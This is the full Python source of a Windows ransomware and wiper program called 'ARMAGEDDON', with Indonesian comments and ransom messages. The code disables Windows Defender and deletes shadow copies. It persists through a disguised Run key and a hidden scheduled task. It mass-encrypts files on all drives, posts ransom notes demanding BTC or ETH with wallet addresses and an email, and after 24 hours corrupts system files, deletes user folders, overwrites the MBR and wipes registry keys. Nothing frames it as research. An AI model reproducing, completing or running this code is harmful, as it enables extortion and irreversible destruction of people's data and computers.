#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import pathlib
import secrets
import os
import base64
import getpass
import sys
import ctypes
import subprocess
import threading
import time
import random
import string
import shutil
import winreg
import socket
import datetime
import uuid
import hashlib
import win32api
import win32con
import win32security
from pathlib import Path
from threading import Thread, Lock

import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

# ============================================
# KONFIGURASI RANSOMWARE
# ============================================
RANSOMWARE_EXTENSION = ".armageddon"
RANSOM_AMOUNT_BTC = 1.0  # 1 Bitcoin
RANSOM_AMOUNT_ETH = 10.0  # 10 Ethereum
DESTRUCTION_TIMER = 86400  # 24 jam dalam detik

# Alamat pembayaran attacker
ATTACKER_ETH_ADDRESS = "0x81830DF553d62bE793c3E7dC0184d8F3728b33F3"
ATTACKER_BTC_ADDRESS = "bc1qvd00grpp3kea4nlgexvv7ktam62fv9lepfyt6w"
ATTACKER_EMAIL = "retaabi58@gmail.com"

# ============================================
# FUNGSI UTILITY
# ============================================
def hide_console():
    """Sembunyikan console window"""
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hWnd = kernel32.GetConsoleWindow()
        if hWnd:
            user32.ShowWindow(hWnd, 0)
    except:
        pass

def run_as_admin():
    """Jalankan sebagai administrator"""
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        
        # Re-run sebagai admin
        params = " ".join([f'"{sys.argv[0]}"'] + sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, params, None, 1
        )
        sys.exit(0)
    except:
        return False

def disable_windows_defender():
    """Nonaktifkan Windows Defender secara permanen"""
    try:
        commands = [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
            'powershell -Command "Add-MpPreference -ExclusionPath C:\\"',
            'REG ADD "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
            'net stop WinDefend',
            'sc config WinDefend start= disabled'
        ]
        
        for cmd in commands:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def delete_shadow_copies():
    """Hapus semua shadow copies dan restore points"""
    try:
        subprocess.run('vssadmin delete shadows /all /quiet', shell=True, 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run('wmic shadowcopy delete', shell=True,
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def change_wallpaper():
    """Ubah wallpaper desktop"""
    try:
        wallpaper_content = f"""
        ╔══════════════════════════════════════════════════════════════╗
        ║                    ARMAGEDDON RANSOMWARE                     ║
        ║                                                              ║
        ║           SEMUA FILE ANDA TELAH DIENKRIPSI!                  ║
        ║                                                              ║
        ║   Kirim {RANSOM_AMOUNT_BTC} BTC atau {RANSOM_AMOUNT_ETH} ETH ke:              ║
        ║   BTC: {ATTACKER_BTC_ADDRESS}                                ║
        ║   ETH: {ATTACKER_ETH_ADDRESS}                                ║
        ║                                                              ║
        ║   Email bukti: {ATTACKER_EMAIL}                              ║
        ║   Waktu: 24 JAM                                              ║
        ║                                                              ║
        ╚══════════════════════════════════════════════════════════════╝
        """
        
        # Buat file wallpaper
        wallpaper_path = os.path.join(os.environ['TEMP'], 'armageddon_wallpaper.bmp')
        
        # Simpan sebagai bitmap sederhana
        with open(wallpaper_path, 'w', encoding='utf-8') as f:
            f.write(wallpaper_content)
        
        # Set sebagai wallpaper
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
    except:
        pass

def create_ransom_note():
    """Buat file tebusan di berbagai lokasi"""
    ransom_text = f"""
╔══════════════════════════════════════════════════════════════╗
║                    ARMAGEDDON RANSOMWARE                     ║
║                    ---------------------                     ║
╚══════════════════════════════════════════════════════════════╝

‼️ PERINGATAN: SEMUA FILE ANDA TELAH DIENKRIPSI! ‼️

File yang terkena:
✓ Dokumen (Word, Excel, PDF, dll)
✓ Foto & Gambar (JPG, PNG, RAW, dll)
✓ Video & Musik (MP4, AVI, MP3, dll)
✓ Database (SQL, Access, dll)
✓ Source code & Programming files
✓ Backup files & Archives
✓ Dan SEMUA file penting lainnya


💰 TEBUSAN:
• {RANSOM_AMOUNT_BTC} Bitcoin (BTC)
• ATAU {RANSOM_AMOUNT_ETH} Ethereum (ETH)

Kirim ke:
┌─────────────────────────────────────────────┐
│ BTC: {ATTACKER_BTC_ADDRESS}                 │
│ ETH: {ATTACKER_ETH_ADDRESS}                 │
└─────────────────────────────────────────────┘

📧 Kirim bukti transfer ke: {ATTACKER_EMAIL}


⚠️ PERINGATAN PENTING:
• JANGAN matikan komputer
• JANGAN coba dekripsi sendiri
• JANGAN install ulang Windows
• JANGAN hapus file {RANSOMWARE_EXTENSION}
• JANGAN gunakan recovery tools


⏰ WAKTU: 24 JAM
Setelah waktu habis:
1. Semua file akan dihapus permanen
2. System akan dihancurkan
3. Komputer tidak bisa digunakan lagi


📊 INFORMASI KORBAN:
• Computer: {socket.gethostname()}
• User: {getpass.getuser()}
• IP: {socket.gethostbyname(socket.gethostname())}
• Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

                -[ ARMAGEDDON RANSOMWARE ]-
"""
    
    # Simpan di banyak lokasi
    locations = [
        os.path.join(os.environ['USERPROFILE'], 'Desktop', 'READ_ME_NOW.txt'),
        os.path.join(os.environ['USERPROFILE'], 'Documents', 'READ_ME_NOW.txt'),
        'C:\\READ_ME_NOW.txt',
        os.path.join(os.environ['USERPROFILE'], 'Downloads', 'READ_ME_NOW.txt'),
        os.path.join(os.environ['USERPROFILE'], 'Pictures', 'READ_ME_NOW.txt')
    ]
    
    for location in locations:
        try:
            with open(location, 'w', encoding='utf-8') as f:
                f.write(ransom_text)
        except:
            pass

def show_ransom_cmd():
    """Tampilkan ransom note di CMD dengan warna merah"""
    try:
        # Buat batch file untuk menampilkan ransom note
        batch_content = f"""
@echo off
title ARMAGEDDON RANSOMWARE
color 0C
mode con: cols=80 lines=50

echo ╔══════════════════════════════════════════════════════════════╗
echo ║                    ARMAGEDDON RANSOMWARE                     ║
echo ╚══════════════════════════════════════════════════════════════╝
echo.
echo SEMUA FILE ANDA TELAH DIENKRIPSI!
echo.
echo Kirim {RANSOM_AMOUNT_BTC} BTC atau {RANSOM_AMOUNT_ETH} ETH ke:
echo BTC: {ATTACKER_BTC_ADDRESS}
echo ETH: {ATTACKER_ETH_ADDRESS}
echo.
echo Email bukti: {ATTACKER_EMAIL}
echo Waktu: 24 JAM
echo.
echo JIKA 24 JAM TIDAK MEMBAYAR DAN KIRIM BUKTI AKAN OTOMATIS HANCURKAN SYSTEM
echo.
echo Tekan CTRL+C untuk keluar (tidak disarankan)
pause
"""
        
        batch_path = os.path.join(os.environ['TEMP'], 'ransom_display.bat')
        with open(batch_path, 'w', encoding='utf-8') as f:
            f.write(batch_content)
        
        # Jalankan CMD
        subprocess.Popen(['cmd', '/c', batch_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
    except:
        pass

# ============================================
# FUNGSI ENKRIPSI MODIFIKASI
# ============================================
def generate_salt(size=32):
    """Generate salt dengan ukuran besar untuk keamanan lebih"""
    return secrets.token_bytes(size)

def derive_key(salt, password):
    """Derive key dari password dengan parameter scrypt yang kuat"""
    kdf = Scrypt(salt=salt, length=64, n=2**18, r=8, p=2)  # Parameter lebih kuat
    return kdf.derive(password.encode())

def load_salt():
    """Load salt dari file"""
    try:
        return open("armageddon_salt.dat", "rb").read()
    except:
        return generate_salt()

def generate_key(password, load_existing_salt=True, save_salt=True):
    """Generate key untuk enkripsi"""
    if load_existing_salt:
        salt = load_salt()
    else:
        salt = generate_salt()
        if save_salt:
            with open("armageddon_salt.dat", "wb") as salt_file:
                salt_file.write(salt)
    
    derived_key = derive_key(salt, password)
    return base64.urlsafe_b64encode(derived_key[:32])  # Ambil 32 byte untuk Fernet

# ============================================
# ENKRIPSI FILE BESAR (10GB+ SUPPORT)
# ============================================
def encrypt_large_file(filename, key, chunk_size=64*1024*1024):  # 64MB chunks
    """Encrypt file besar dengan chunking untuk menghindari memory overflow"""
    try:
        f = Fernet(key)
        temp_filename = filename + ".tmp"
        
        with open(filename, 'rb') as infile, open(temp_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunk_size)
                if not chunk:
                    break
                encrypted_chunk = f.encrypt(chunk)
                outfile.write(encrypted_chunk)
        
        # Ganti file asli dengan yang terenkripsi
        os.remove(filename)
        os.rename(temp_filename, filename + RANSOMWARE_EXTENSION)
        return True
        
    except Exception as e:
        return False

def decrypt_large_file(filename, key, chunk_size=64*1024*1024):
    """Decrypt file besar dengan chunking"""
    try:
        f = Fernet(key)
        temp_filename = filename.replace(RANSOMWARE_EXTENSION, "") + ".tmp"
        
        with open(filename, 'rb') as infile, open(temp_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunk_size)
                if not chunk:
                    break
                try:
                    decrypted_chunk = f.decrypt(chunk)
                    outfile.write(decrypted_chunk)
                except cryptography.fernet.InvalidToken:
                    return False
        
        # Ganti file terenkripsi dengan yang didekripsi
        os.remove(filename)
        os.rename(temp_filename, filename.replace(RANSOMWARE_EXTENSION, ""))
        return True
        
    except Exception as e:
        return False

# ============================================
# SYSTEM DESTRUCTION (24 JAM)
# ============================================
class SystemDestroyer:
    def __init__(self):
        self.destruction_started = False
        self.destruction_thread = None
    
    def start_destruction_timer(self):
        """Mulai timer destruction 24 jam"""
        if not self.destruction_started:
            self.destruction_thread = threading.Thread(target=self._destruction_countdown)
            self.destruction_thread.start()
            self.destruction_started = True
    
    def _destruction_countdown(self):
        """Countdown 24 jam sebelum destruction"""
        time.sleep(DESTRUCTION_TIMER)
        self.execute_destruction()
    
    def execute_destruction(self):
        """Eksekusi penghancuran sistem permanen"""
        try:
            # Tahap 1: Corrupt system files
            self.corrupt_system_files()
            
            # Tahap 2: Hapus semua file user
            self.delete_user_files()
            
            # Tahap 3: Hancurkan MBR
            self.destroy_mbr()
            
            # Tahap 4: Corrupt registry
            self.corrupt_registry()
            
            # Tahap 5: Kill system
            self.kill_system()
            
        except:
            pass
    
    def corrupt_system_files(self):
        """Corrupt file sistem Windows"""
        system_files = [
            "C:\\Windows\\System32\\ntoskrnl.exe",
            "C:\\Windows\\System32\\hal.dll",
            "C:\\Windows\\System32\\winload.exe",
            "C:\\Windows\\System32\\winlogon.exe",
            "C:\\Windows\\System32\\csrss.exe"
        ]
        
        for file in system_files:
            if os.path.exists(file):
                try:
                    with open(file, 'wb') as f:
                        f.write(os.urandom(1024))  # Tulis data random
                except:
                    pass
    
    def delete_user_files(self):
        """Hapus semua file user"""
        user_dirs = [
            os.path.join(os.environ['USERPROFILE'], 'Desktop'),
            os.path.join(os.environ['USERPROFILE'], 'Documents'),
            os.path.join(os.environ['USERPROFILE'], 'Pictures'),
            os.path.join(os.environ['USERPROFILE'], 'Downloads'),
            os.path.join(os.environ['USERPROFILE'], 'Music'),
            os.path.join(os.environ['USERPROFILE'], 'Videos')
        ]
        
        for directory in user_dirs:
            if os.path.exists(directory):
                try:
                    shutil.rmtree(directory)
                except:
                    pass
    
    def destroy_mbr(self):
        """Hancurkan Master Boot Record"""
        try:
            # Overwrite MBR dengan data random
            mbr_data = os.urandom(512)
            with open("\\\\.\\PhysicalDrive0", "wb") as drive:
                drive.write(mbr_data)
        except:
            pass
    
    def corrupt_registry(self):
        """Corrupt registry Windows"""
        try:
            # Corrupt beberapa key penting
            subprocess.run('REG DELETE "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" /f', 
                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run('REG DELETE "HKLM\\SYSTEM\\CurrentControlSet\\Control" /f',
                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    
    def kill_system(self):
        """Shutdown system permanen"""
        try:
            subprocess.run('shutdown /s /f /t 0', shell=True)
        except:
            pass

# ============================================
# AUTO-START & PERSISTENCE
# ============================================
def add_to_startup():
    """Tambahkan ransomware ke startup Windows"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0, winreg.KEY_SET_VALUE)
        
        ransomware_path = sys.argv[0]
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, ransomware_path)
        winreg.CloseKey(key)
    except:
        pass

def create_scheduled_task():
    """Buat scheduled task untuk auto-run"""
    try:
        xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{sys.argv[0]}"</Command>
    </Exec>
  </Actions>
</Task>'''
        
        xml_path = os.path.join(os.environ['TEMP'], 'armageddon_task.xml')
        with open(xml_path, 'w') as f:
            f.write(xml_content)
        
        subprocess.run(f'schtasks /create /tn "Microsoft\\Windows\\WindowsUpdate\\Armageddon" /xml "{xml_path}" /f',
                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        os.remove(xml_path)
    except:
        pass

# ============================================
# ENKRIPSI MASSAL MULTI-THREAD
# ============================================
class MassEncryptor:
    def __init__(self, key):
        self.key = key
        self.encrypted_count = 0
        self.failed_count = 0
        self.lock = Lock()
        
        # Target semua ekstensi file
        self.target_extensions = [
            # Documents
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
            '.txt', '.rtf', '.odt', '.ods', '.odp', '.csv', '.xml',
            '.html', '.htm', '.md', '.tex', '.epub', '.mobi',
            
            # Media
            '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.tiff', '.webp',
            '.psd', '.ai', '.eps', '.svg', '.raw', '.cr2', '.nef',
            
            # Audio
            '.mp3', '.wav', '.flac', '.aac', '.wma', '.m4a', '.ogg',
            
            # Video
            '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm',
            '.m4v', '.mpg', '.mpeg', '.3gp', '.vob',
            
            # Archives
            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.iso',
            
            # Database
            '.db', '.sql', '.sqlite', '.mdb', '.accdb', '.dbf',
            
            # Programming
            '.py', '.java', '.cpp', '.c', '.js', '.php', '.html',
            '.css', '.json', '.xml', '.yaml', '.yml',
            
            # Backup
            '.bak', '.backup', '.old', '.tmp',
            
            # Crypto
            '.wallet', '.dat', '.keys', '.seed',
            
            # Email
            '.pst', '.ost', '.eml', '.msg',
            
            # Other
            '.torrent', '.ps', '.indd', '.dwg', '.dxf'
        ]
    
    def get_all_drives(self):
        """Dapatkan semua drive di sistem"""
        drives = []
        for drive_letter in string.ascii_uppercase:
            drive = f"{drive_letter}:\\"
            if os.path.exists(drive):
                drives.append(drive)
        return drives
    
    def find_target_files(self, start_path):
        """Cari semua file target"""
        target_files = []
        
        for root, dirs, files in os.walk(start_path):
            # Skip system directories
            if any(x in root.lower() for x in ['windows', 'program files', '$recycle.bin', 'system volume information']):
                continue
            
            for file in files:
                file_path = os.path.join(root, file)
                
                # Skip file terenkripsi
                if file.endswith(RANSOMWARE_EXTENSION):
                    continue
                
                # Skip file sistem
                if file.lower() in ['ntoskrnl.exe', 'winlogon.exe', 'explorer.exe']:
                    continue
                
                # Filter by extension
                ext = os.path.splitext(file)[1].lower()
                if ext in self.target_extensions:
                    try:
                        # Skip file terlalu kecil atau terlalu besar
                        size = os.path.getsize(file_path)
                        if 1024 <= size <= 1099511627776:  # 1KB - 1TB
                            target_files.append(file_path)
                    except:
                        continue
        
        return target_files
    
    def encrypt_file_thread(self, file_list):
        """Thread untuk enkripsi file"""
        for file_path in file_list:
            try:
                size = os.path.getsize(file_path)
                
                if size > 1073741824:  # > 1GB
                    success = encrypt_large_file(file_path, self.key)
                else:
                    # File kecil, enkripsi langsung
                    with open(file_path, 'rb') as f:
                        data = f.read()
                    
                    f = Fernet(self.key)
                    encrypted_data = f.encrypt(data)
                    
                    with open(file_path + RANSOMWARE_EXTENSION, 'wb') as f:
                        f.write(encrypted_data)
                    
                    os.remove(file_path)
                    success = True
                
                with self.lock:
                    if success:
                        self.encrypted_count += 1
                        if self.encrypted_count % 100 == 0:
                            print(f"[*] Encrypted: {self.encrypted_count} files")
                    else:
                        self.failed_count += 1
            
            except Exception as e:
                with self.lock:
                    self.failed_count += 1
    
    def start_mass_encryption(self):
        """Mulai enkripsi massal seluruh sistem"""
        print("[*] Scanning for files to encrypt...")
        
        all_files = []
        drives = self.get_all_drives()
        
        for drive in drives:
            print(f"[*] Scanning drive: {drive}")
            files = self.find_target_files(drive)
            all_files.extend(files)
            print(f"[+] Found {len(files)} files on {drive}")
        
        print(f"[+] Total files found: {len(all_files)}")
        
        if len(all_files) == 0:
            print("[!] No files found to encrypt")
            return
        
        # Bagi file ke threads
        num_threads = min(20, len(all_files))
        chunk_size = len(all_files) // num_threads
        
        threads = []
        for i in range(num_threads):
            start_idx = i * chunk_size
            end_idx = start_idx + chunk_size if i < num_threads - 1 else len(all_files)
            chunk = all_files[start_idx:end_idx]
            
            thread = threading.Thread(target=self.encrypt_file_thread, args=(chunk,))
            threads.append(thread)
            thread.start()
        
        # Tunggu semua thread selesai
        for thread in threads:
            thread.join()
        
        print(f"\n[+] Encryption complete!")
        print(f"[+] Files encrypted: {self.encrypted_count}")
        print(f"[+] Files failed: {self.failed_count}")

# ============================================
# MAIN EXECUTION - AUTO ENCRYPT ON EXECUTE
# ============================================
def main():
    """Fungsi utama - auto encrypt saat dijalankan"""
    
    # Hide console
    hide_console()
    
    # Coba run sebagai admin
    run_as_admin()
    
    # Disable Windows Defender
    disable_windows_defender()
    
    # Hapus shadow copies
    delete_shadow_copies()
    
    # Add to startup
    add_to_startup()
    create_scheduled_task()
    
    # Generate encryption key
    password = "armageddon_ultra_key_2024"
    key = generate_key(password, load_existing_salt=False, save_salt=True)
    
    # Mulai mass encryption
    encryptor = MassEncryptor(key)
    
    # Tampilkan ransom CMD
    show_ransom_cmd()
    
    # Mulai encryption di background thread
    encryption_thread = threading.Thread(target=encryptor.start_mass_encryption)
    encryption_thread.start()
    
    # Ubah wallpaper
    change_wallpaper()
    
    # Buat ransom note
    create_ransom_note()
    
    # Mulai destruction timer
    destroyer = SystemDestroyer()
    destroyer.start_destruction_timer()
    
    # Keep running
    while True:
        time.sleep(60)

# ============================================
# ORIGINAL FUNCTIONS (DIPERTAHANKAN)
# ============================================
def encrypt(filename, key):
    """Encrypt file (untuk backward compatibility)"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename + RANSOMWARE_EXTENSION, "wb") as file:
        file.write(encrypted_data)
    os.remove(filename)

def encrypt_folder(foldername, key):
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Encrypting {child}")
            encrypt(child, key)
        elif child.is_dir():
            encrypt_folder(child, key)

def decrypt(filename, key):
    """Decrypt file (untuk backward compatibility)"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        encrypted_data = file.read()
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("[!] Invalid token, most likely the password is incorrect")
        return
    with open(filename.replace(RANSOMWARE_EXTENSION, ""), "wb") as file:
        file.write(decrypted_data)
    os.remove(filename)

def decrypt_folder(foldername, key):
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file() and str(child).endswith(RANSOMWARE_EXTENSION):
            print(f"[*] Decrypting {child}")
            decrypt(child, key)
        elif child.is_dir():
            decrypt_folder(child, key)

# ============================================
# COMMAND LINE INTERFACE (UNTUK DEBUG)
# ============================================
if __name__ == "__main__":
    # Jika dijalankan dengan argumen, gunakan mode original
    if len(sys.argv) > 1:
        import argparse
        parser = argparse.ArgumentParser(description="ARMAGEDDON RANSOMWARE")
        parser.add_argument("path", help="Path to encrypt/decrypt")
        parser.add_argument("-e", "--encrypt", action="store_true", help="Encrypt file/folder")
        parser.add_argument("-d", "--decrypt", action="store_true", help="Decrypt file/folder")
        parser.add_argument("-p", "--password", help="Password for encryption/decryption")
        
        args = parser.parse_args()
        
        if args.encrypt:
            password = args.password or getpass.getpass("Enter password for encryption: ")
        elif args.decrypt:
            password = args.password or getpass.getpass("Enter password for decryption: ")
        else:
            # Jika tidak ada argumen, jalankan auto-encrypt mode
            main()
            sys.exit(0)
        
        key = generate_key(password, load_existing_salt=True)
        
        if args.encrypt:
            if os.path.isfile(args.path):
                encrypt(args.path, key)
            elif os.path.isdir(args.path):
                encrypt_folder(args.path, key)
        elif args.decrypt:
            if os.path.isfile(args.path):
                decrypt(args.path, key)
            elif os.path.isdir(args.path):
                decrypt_folder(args.path, key)
    else:
        # Auto-execute mode
        main()
